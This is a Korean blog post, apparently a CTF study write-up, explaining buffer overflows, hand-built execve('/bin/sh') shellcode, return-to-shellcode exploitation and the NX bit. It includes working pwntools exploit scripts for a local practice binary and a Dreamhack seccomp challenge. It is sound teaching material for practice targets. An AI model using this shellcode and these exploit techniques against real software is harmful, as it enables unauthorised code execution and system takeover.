---
tistoryBlogName: k0n9
tistoryTitle: BoF, Shellcode, Nx bit
tistoryVisibility: "0"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "19"
tistoryPostUrl: https://k0n9.tistory.com/19
---
## Buffer overflow란?

버퍼가 허용할 수 있는 크기의 데이터를 넘어 더 많은 데이터를 입력 받아 버퍼가 넘치는 취약점이다. 대부분 입력값의 크기제한을 하지 않아서 발생을 한다. BOF가 발생하는 위치에 따라 Stack BOF, Heap BOF로 불린다.

### Stack Buffer overflow
10크기의 A라는 배열과, B라는 배열을 만들었다고 하자.

![](https://i.imgur.com/DLwbwdG.png)


그리고 B배열 20의 크기의 데이터를 집어넣으면 오버플로우가 발생하며 남은 값들은 A배열에 저장된다.

![](https://i.imgur.com/V8pM0X1.png)


외부의 입력없이 일어날수도 있다. 10크기의 a배열과 b배열을 만들고 data의 배열을 만들고 20의 크기의 데이터를 집어넣는다. 그리고 data의 배열을 b배열에 복사한다. 그러면 overflow가 일어나서 남은 데이터들은 a배열에 저장된다.

### Heap Buffer overflow
Heap overflow는 buffer overflow를 시켜서 동적 메모리 할당 연결을 덮어씀으로서 함수 포인터를 조작한다. 포인터가 가르키는 값이 변경되어 공격자가 주입한 코드를 실행시킨다.



## Shellcode
셸코드란 작은 크기의 코드로 소프트웨어 취약점 이용을 위한 내용부에서 사용된다. 주로 기계어 코드로 이루어졌으며 명령 셸을 시작시켜 공격자가 영향 받은 컴퓨터를 제어한다.

### shellcode 만들기


32bit를 기준으로 shellcode를 만들어보자.

우선 c언어로 셸을 실행시키는 코드를 만들어보자

```c
#include <unistd.h>
int main(){
	char *sh[] = {"/bin/sh", NULL};
	execve(sh[0], sh, NULL);
	return 0;
}
```

32bit의 셸코드에서 eax에는 syscall함수인 execve의 값으로 0xb가 들어있다.

![](https://i.imgur.com/p8S0p8w.png)

그리고 ebx에는 execve의 1번째 인자값인 “/bin/sh”, ecx에는 2번째 인자값인 /bin/sh의 주소값, edx에는 3번째 인자값인 널값이 들어있다.

우선은 eax와 edx를 값을 0으로 한다. 그리고 0x0을 푸쉬하고 16진수로 표현된 /bin/sh를 push한다. 그리고 esp값 즉 /bin/sh의 주소값을 ebx에 넣는다. 그리고 0을 push한 후 ebx를 push하고 ecx에 esp값 즉 ebx의 주소값을 ecx에 넣는다. 그리고 0xb를 eax에 넣고 int 0x80으로 syscall을 한다.
이를 어셈블리어로 나타내면 아래와 같다.
```C
int main() {
    __asm__("xor %eax,%eax");
    __asm__("xor %edx,%edx");
    __asm__("push $0x0");
 
    __asm__("push $0x68732f2f");
    __asm__("push $0x6e69622f");
  
    __asm__("mov  %esp, %ebx");
  
    __asm__("push $0x0");
    __asm__("push %ebx");
    __asm__("mov  %esp, %ecx");
  
    __asm__("mov  $0xb, %eax");
    __asm__("int  $0x80");
}
```

그리고 이것을 objdump로 하면 기계어로 된 코드를 볼 수 있다.

![](https://i.imgur.com/EYtr4W7.png)


그리고 필요한 부분만 잘라서 모으면 결과적으로 이렇게 된다.
```C
# include <stdint.h>

int main(){
    uint8_t shellcode[] = {
        0x31, 0xc0, 0x31, 0xd2,
        0x6a, 0x00, 0x68, 0x2f,
        0x2f, 0x73, 0x68, 0x68,
        0x2f, 0x62, 0x69, 0x6e,
        0x89, 0xe3, 0x6a, 0x00,
        0x53, 0x89, 0xe1, 0xb8,
        0x0b, 0x00, 0x00, 0x00,
        0xcd, 0x80
    };
    ((void(*)())&shellcode)();
    return 0;
}
```
이 기계어 코드가 최종적으로 셸코드가 된다.

## RTS
Return to Shellcode
BOF로 exploit하는 방법의 일종

스택프레임의 RET을 shellcode로 덮어쓴다.

- 공격자는 주입한 공격코드를 실행시키기 위해서는 다음 실행시킬 코드의 주소를 저장하고 있는 **EIP** 레지스터를 조작한다. 공격자는 셸을 실행시키는 코드(shellcode)를 미리 주입해 둔 후(보통 buf에 입력)에 공격 코드의 주소를 RET에 입력함으로서 셸을 실행시킬 수 있다. 기본적으로 RET에는 명령어 복귀 주소가 들어있지만 이를 덮어씌우는 것이다.

![](https://i.imgur.com/9zx8fZr.png)

![](https://i.imgur.com/PH4z1kv.png)

### 예제 1
새싹첼의 rts를 풀어보자
```C
# include <stdio.h>
# include <stdlib.h>
# include <stdint.h>
# include <unistd.h>
  
void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}
  
int main() {
    setup_environment();
    register volatile uint64_t rsp asm("rsp");  
    printf("[+] rsp : 0x%016lx\n", rsp);  
    char buffer[0x40] = { '\0' };
    printf("[+] Input\n");
    printf("> ");
    read(0, buffer, 0x60);
    return 0;
}
```

![](https://i.imgur.com/myCfncJ.png)
보호기법은 위와같다.

시작하면 buffer의 주소를 알려준다. 그러면 shellcode + buffer_dummy + sfp + buffer_add 로 익스플로잇을 할 수 있다.
익스플로잇 코드를 보자.

```python
from pwn import *
  
context(arch = "amd64", os='linux')
  
p = process("./rts")
  
shell = asm(shellcraft.execve("/bin/sh", 0, 0))
  
rbp = b'\x41\x41\x41\x41\x41\x41\x41\x41'
p.recvuntil('0x0000')
  
rspadd = int(p.recvn(12),16)
rspadd = p64(rspadd)
  
exp = shell + b'\x90'*(0x40-len(shell)) + rbp + rspadd
  
p.sendafter(b"> ", exp)
p.interactive()
```

우선 여기서 shellcraft란 pwntools에 자주 사용되는 셸 코드들이 저장되어있다. 우선 코드 상단에  context(arch='amd64', os='linux') 로 환경을 적어주고 shellcraft.함수 로 셸코드를 만들 수 있다.

recvuntil로 buffer의 주소를 저장해주고 shellcode + dummy + sfp + buffer_add를 입력하면 ret에 buffer_add를 넣어서 실행흐름을 shellcode로 이동시켜서 shellcode가 실행되어 shell이 실행된다.
![](https://i.imgur.com/Pe9fSFf.png)


### 예제 _ dreamhack

dreamhack의 shell_basic을 풀어보자.

```C
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev
  
#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>
  
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
  
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}
  
void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  
  seccomp_load(ctx);
}
  
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);  
  void (*sc)();
  init();
  banned_execve();
  
  printf("shellcode: ");
  read(0, shellcode, 0x1000);
  
  sc = (void *)shellcode;
  sc();
}
```
셸코드를 입력받고 그것을 실행하는 코드이다. 하지만 seccomp로 execve와 execveat를 사용하지 못한다. 이럴경우 이에 해당하지 않는 다른 함수를 이용할 수 있다.

익스플로잇 코드는 아래와 같다.
```python
from pwn import *
  
context(arch='amd64', os='linux')
# p = process("./shell_basic")
p = remote("host3.dreamhack.games", 13918)
  
shellcode = shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
shellcode += "mov rdi, rax"
shellcode += shellcraft.read("rdi", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)
  
p.sendline(asm(shellcode))
  
p.interactive()
```


셸 코드 설명을 해보면 우선 open으로 /home/shell_basic/flag_name_is_loooooong를 연다. 이 값은 rax로 반환되니 mov rdi, rax를 하고 read로 rsp에 flag파일을 읽는다. 그리고 write로 읽은 값을 출력하면 flag를 알아낼 수 있다.

![](https://i.imgur.com/23Ovlyn.png)

### NX bit
NX Bit는 데이터 영역(여기서 데이터 영역은 code 영역을 제외한 영역이다.)에서 코드의 실행을 막는 보호기법이다. 이러한 보호기법이 있는 이유는 셸 코드의 실행을 막기 위함이다. 셸 코드는 표준입력이나 파일 입력 등을 이용해 프로그램 외부에서 공격자가 주입하는데, 이때 셸 코드가 주입되는 위치가 대부분 힙, 스택 영역이기 때문이다.

옵션은 컴파일시 -z execstack 으로 끌 수 있다. 

예제1에 nx-bit를 키고 다시 실행시켜보자.

![](https://i.imgur.com/cDrCFvR.png)

![](https://i.imgur.com/z8dB7Pu.png)
셸이 실행되지 않는다.